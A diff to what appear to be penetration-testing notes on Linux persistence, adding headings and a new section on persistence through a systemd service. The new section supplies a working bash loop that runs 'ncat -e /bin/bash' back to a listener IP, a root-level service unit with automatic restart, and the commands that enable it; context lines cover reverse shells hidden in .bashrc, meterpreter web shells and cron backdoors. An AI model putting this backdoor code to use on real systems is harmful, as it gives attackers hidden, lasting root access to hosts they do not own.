@@ -60,7 +60,9 @@ In order to perform this technique, you need to have obtained initial access to 
 
     We have now been able to successfully set up persistent access via SSH keys and consequently mitigating any future authentication failures caused by changed passwords.
 
+++++++++++++++++++++
 Creating A Privileged Local Account
+++++++++++++++++++++
 
 The next persistence technique we will be exploring is the process of creating a privileged local account for backdoor access, this technique can be used to maintain access to a target system if a user account password is changed, however, creating a local user account may lead to detection on servers that have fewer user and service accounts as a new user will easily be noticed.
 
@@ -122,7 +124,9 @@ This persistence technique will involve adding a bash reverse command that will 
 
     We have now been able to set up persistence via the .bashrc file, this technique has the added advantage of being harder to detect as the reverse shell command is hidden within a legitimate configuration file.
 
+++++++++++++++++++++
 Persistence Via Web Shell
+++++++++++++++++++++
 
 This persistence technique involves generating and uploading a PHP web shell to the target server. Given that the target server is running the LAMP stack, we can create a PHP meterpreter payload and upload it to the web server as a backdoor.
 
@@ -171,7 +175,9 @@ This persistence technique involves generating and uploading a PHP web shell to 
 
     We have been able to successfully set up persistence by uploading a meterpreter web shell that allows us to maintain access to the target server without authenticating via SSH.
 
+++++++++++++++++++++
 Persistence Via Cron Jobs
+++++++++++++++++++++
 
 This technique involves leveraging Cron jobs to maintain persistent access to the target system by executing a reverse shell command or a web shell repeatedly on a specified schedule.
 
@@ -218,4 +224,59 @@ Cron provides you with the ability to run a program, script, or command periodic
     Meterpreter session after backup.php exploit executed from crontab
 
     We have now been able to successfully setup persistence on the target server by creating a cron job that connects back to our listener, additionally, we were also able to setup a cron job that executes the PHP meterpreter shell we uploaded to the target server.
+
+
+
+++++++++++++++++++++++++++++++++++++++++
+CREATING PERSISTANCE USING SERVICE UNIT
+++++++++++++++++++++++++++++++++++++++++
+
+1) create bash script in /root/.config
+
+```
+#!/bin/bash
+attempts=1
+while true
+do
+    ncat -e /bin/bash 192.168.0.177 12345 2> /dev/null
+    echo "Connection number ${attempts}" >> attempts;
+    $((attempts++));
+    sleep 10;
+done
+```
+
+2) create service in /etc/systemd/system/
+```
+[Unit]
+Description=Connection service
+
+[Service]
+User=root
+WorkingDirectory=/root/.rootconfig/
+ExecStart=/root/.rootconfig/rootservice.sh
+Restart=always
+
+[Install]
+WantedBy=multi-user-target
+```
+
+3) enable service by "`systemctl enable connection.service`"
+     start service by "`systemct start connection.service`"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
